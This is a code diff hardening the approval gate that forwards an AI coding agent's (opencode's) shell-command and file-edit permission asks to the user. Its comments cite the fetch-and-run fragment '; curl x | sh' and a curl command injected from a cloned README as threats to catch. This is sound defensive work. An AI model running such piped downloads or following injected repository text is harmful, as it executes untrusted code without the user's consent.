@@ -24,9 +24,11 @@ Event translation into the chat panel's existing vocabulary:
 * ``session.idle``                     -> end of turn.
 * ``session.error``                    -> ``error``.
 * ``permission.asked``                 -> forwarded to the user as a
-  ``permission_request`` and answered from their Approve/Deny decision
-  (SEC-4), unless command approval is switched off, in which case it is
-  auto-approved ("always").
+  ``permission_request`` carrying the permission ``kind`` ("bash", "edit",
+  …) and the tool's own command text, then answered from their Approve/Deny
+  decision (SEC-4). The reply is always ``once``/``reject`` — never
+  ``always``, which opencode stores for the whole serve process — and with
+  command approval switched off the ask is answered ``once`` without a card.
 """
 
 from __future__ import annotations
@@ -49,15 +51,59 @@ if TYPE_CHECKING:
 log = structlog.get_logger()
 
 
+def _permission_kind(props: dict[str, Any]) -> str:
+    """opencode's permission key for an ask: "bash", "edit",
+    "external_directory", "doom_loop", … (the `permission` field at v1.18.8;
+    pre-1.18 builds spelled it `type`)."""
+    return str(props.get("permission") or props.get("type") or "unknown").strip()
+
+
 def _permission_summary(props: dict[str, Any]) -> str:
-    """Best-effort one-liner describing what opencode wants to run, for the
-    approval card. opencode's permission.asked shape varies by tool, so pull
-    the command from metadata when present and fall back to the title."""
-    meta = props.get("metadata") or {}
-    cmd = ""
-    if isinstance(meta, dict):
-        cmd = str(meta.get("command") or meta.get("cmd") or "")
-    return (cmd or props.get("title") or props.get("pattern") or "").strip()[:300]
+    """Exactly what opencode is asking to do, for the approval card (NEW-06).
+
+    Only tool-authored fields are used: `metadata.command` is the full command
+    string the bash tool hands to the shell, `metadata.filepath` the resolved
+    edit target. The model-authored `title` is deliberately never shown — a
+    card reading "List files" above a command the user cannot see is worse
+    than an empty one, and an empty summary is a signal the UI can act on (it
+    disables Approve). There is no length cap either: the card bounds its own
+    height and scrolls, while a cut here hid the tail of long commands, which
+    is where `; curl x | sh` lives.
+    """
+    meta = props.get("metadata")
+    if not isinstance(meta, dict):
+        meta = {}
+    kind = _permission_kind(props)
+
+    if kind in ("bash", "external_directory"):
+        cmd = meta.get("command")
+        text = cmd.strip() if isinstance(cmd, str) else ""
+        dirs = meta.get("directories")
+        if kind == "external_directory" and isinstance(dirs, list) and dirs and text:
+            where = "\n".join(f"  {d}" for d in dirs if isinstance(d, str))
+            text = f"{text}\n\noutside the workspace:\n{where}"
+        # No fallback for a shell command: if opencode sent no command text,
+        # the card must say so rather than show something adjacent.
+        return text
+
+    if kind == "edit":
+        fp = meta.get("filepath")
+        if isinstance(fp, str) and fp.strip():
+            return fp.strip()
+
+    if kind == "doom_loop":
+        tool = meta.get("tool")
+        if isinstance(tool, str) and tool:
+            return f"{tool} called repeatedly with identical input"
+
+    # Anything else: opencode's own pattern strings, which are derived from the
+    # tool input and never model prose. `pattern` is the pre-1.18 spelling.
+    patterns = props.get("patterns") or props.get("pattern") or []
+    if isinstance(patterns, str):
+        patterns = [patterns]
+    if not isinstance(patterns, list):
+        return ""
+    return "\n".join(str(p).strip() for p in patterns if str(p).strip())
 
 OPENCODE_BIN = os.environ.get("STUDIO_OPENCODE_BIN", "opencode")
 OPENCODE_PORT = int(os.environ.get("STUDIO_OPENCODE_PORT", "4747"))
@@ -335,6 +381,73 @@ class OpenCodeEngine:
         except httpx.HTTPError:
             pass
 
+    # --- permission asks (SEC-4) ---
+
+    async def _session_parent(self, auth: httpx.BasicAuth, sid: str) -> str | None:
+        """The session's ``parentID``, or None if it has none / is unknown."""
+        try:
+            async with self._client(auth, timeout=5.0) as c:
+                r = await c.get(f"/session/{sid}")
+                if r.status_code == 200:
+                    parent = (r.json() or {}).get("parentID")
+                    return str(parent) if parent else None
+        except (httpx.HTTPError, ValueError, AttributeError):
+            pass
+        return None
+
+    async def _asks_for(
+        self, auth: httpx.BasicAuth, other: str, sid: str, cache: dict[str, bool]
+    ) -> bool:
+        """True if a permission ask from session *other* belongs to our turn.
+
+        A subagent (the `task` tool) runs in a child session that opencode
+        creates with parentID = our session, and its bash ask is published
+        under the child's sessionID. Dropping it with the rest of the foreign
+        chatter — other conversations, someone's `opencode attach` terminal —
+        would leave the ask unanswered and wedge the turn until the 600 s
+        timeout, so walk parentID up to our session first. Default subagent
+        depth is 1; a few hops is plenty and bounds a cyclic parentID.
+        """
+        if other == sid:
+            return True
+        if other in cache:
+            return cache[other]
+        found, cur = False, other
+        for _ in range(4):
+            parent = await self._session_parent(auth, cur)
+            if parent is None:
+                break
+            if parent == sid:
+                found = True
+                break
+            cur = parent
+        cache[other] = found
+        return found
+
+    async def _reply_permission(
+        self, auth: httpx.BasicAuth, perm_sid: str, perm_id: str, response: str
+    ) -> None:
+        """Answer one ask. *response* is opencode's grammar: once | reject."""
+        try:
+            async with self._client(auth, timeout=5.0) as c:
+                r = await c.post(
+                    f"/session/{perm_sid}/permissions/{perm_id}",
+                    json={"response": response},
+                )
+            # 404 is expected noise: a `reject` cascades to every other pending
+            # ask in the same session, so the reply for one of those arrives
+            # after opencode already resolved it. The tool sees a rejection
+            # either way — only a real failure is worth a line.
+            if r.status_code >= 400 and r.status_code != 404:
+                log.warning(
+                    "opencode_permission_reply_failed",
+                    perm_id=perm_id, status=r.status_code,
+                )
+        except httpx.HTTPError as e:
+            log.warning(
+                "opencode_permission_reply_failed", perm_id=perm_id, error=str(e)
+            )
+
     async def _final_text(self, auth: httpx.BasicAuth, sid: str) -> str:
         """Concatenated text parts of the session's last assistant message."""
         try:
@@ -400,6 +513,8 @@ class OpenCodeEngine:
         part_types: dict[str, str] = {}
         tool_names: dict[str, str] = {}
         tool_phase_seen: set[str] = set()
+        # session id -> "is this session part of our turn" (see _asks_for).
+        lineage: dict[str, bool] = {}
         emitted_text: list[str] = []
         queue: asyncio.Queue[dict[str, Any] | None] = asyncio.Queue(maxsize=500)
 
@@ -482,12 +597,71 @@ class OpenCodeEngine:
 
                 etype = ev.get("type")
                 props = ev.get("properties") or {}
-                if props.get("sessionID") not in (None, sid):
+                ev_sid = props.get("sessionID")
+
+                if etype == "permission.asked":
+                    # Handled ahead of the session filter: a subagent's ask is
+                    # published under the child session opencode created for
+                    # it, not under ours (see _asks_for).
+                    perm_id = str(props.get("id") or "")
+                    perm_sid = str(ev_sid or "")
+                    if not perm_id or not perm_sid:
+                        # The event id used to stand in for a missing
+                        # permission id, which made us POST a decision for a
+                        # permission that does not exist — and show a card for
+                        # it. Without both ids there is nothing to answer.
+                        log.warning(
+                            "opencode_permission_unaddressable",
+                            perm_id=perm_id, session=perm_sid,
+                        )
+                        continue
+                    if not await self._asks_for(auth, perm_sid, sid, lineage):
+                        continue
+                    kind = _permission_kind(props)
+                    summary = _permission_summary(props)
+
+                    # Fail closed. set_db() runs before every served turn
+                    # (routers/chat.py), so a missing DB is theoretical —
+                    # which is exactly why a gate must not read "approve" here.
+                    decision = "deny"
+                    gated = False
+                    if self._db is None:
+                        log.warning(
+                            "opencode_permission_no_db", perm_id=perm_id, kind=kind
+                        )
+                    elif await require_approval(self._db):
+                        gated = True
+                        yield _sse({"permission_request": {
+                            "id": perm_id,
+                            "name": kind,       # back-compat field for the UI
+                            "kind": kind,       # bash | edit | external_directory | …
+                            "summary": summary,  # "" when opencode sent no text
+                        }})
+                        last_emit = time.monotonic()
+                        decision = await await_decision(request_id, perm_id)
+                    else:
+                        decision = "approve"
+
+                    # "once", never "always": an `always` reply stores an allow
+                    # rule for the command prefix in opencode's approved set,
+                    # which every session on this serve process is evaluated
+                    # against — other conversations and attached terminals
+                    # included — until it restarts. One approved `curl *` would
+                    # silence every later curl everywhere, including one
+                    # injected from a cloned README.
+                    response = "once" if decision == "approve" else "reject"
+                    log.info(
+                        "opencode_permission", perm_id=perm_id, kind=kind,
+                        gated=gated, decision=decision, response=response,
+                    )
+                    await self._reply_permission(auth, perm_sid, perm_id, response)
+                    last_emit = time.monotonic()
                     continue
-                if props.get("sessionID") is None and etype not in (
-                    "permission.asked",
-                ):
-                    # Global chatter (plugin.added etc.) — not session-scoped.
+
+                if ev_sid != sid:
+                    # Other sessions (attached terminals, a subagent's own
+                    # message traffic) and global chatter with no sessionID at
+                    # all (plugin.added etc.) — not this turn's.
                     continue
 
                 if etype == "message.part.updated":
@@ -542,35 +716,6 @@ class OpenCodeEngine:
                                 "input": int(toks.get("input") or 0),
                                 "output": int(toks.get("output") or 0),
                             }
-
-                elif etype == "permission.asked":
-                    # SEC-4: forward opencode's own permission prompt to the
-                    # user instead of auto-approving. opencode only asks for
-                    # genuinely sensitive actions (bash, external edits), so
-                    # this is the shell-command gate for the opencode engine.
-                    perm_id = (props.get("id") or ev.get("id") or "")
-                    perm_sid = props.get("sessionID") or sid
-                    if perm_id and perm_sid == sid:
-                        decision = "approve"
-                        if self._db is not None and await require_approval(self._db):
-                            yield _sse({"permission_request": {
-                                "id": perm_id,
-                                "name": props.get("type") or "command",
-                                "summary": _permission_summary(props),
-                            }})
-                            last_emit = time.monotonic()
-                            decision = await await_decision(request_id, perm_id)
-                        # opencode grammar: always=approve, reject=deny.
-                        response = "always" if decision == "approve" else "reject"
-                        try:
-                            async with self._client(auth, timeout=5.0) as c:
-                                await c.post(
-                                    f"/session/{perm_sid}/permissions/{perm_id}",
-                                    json={"response": response},
-                                )
-                        except httpx.HTTPError:
-                            pass
-                        last_emit = time.monotonic()
 
                 elif etype == "session.error":
                     err = props.get("error") or {}
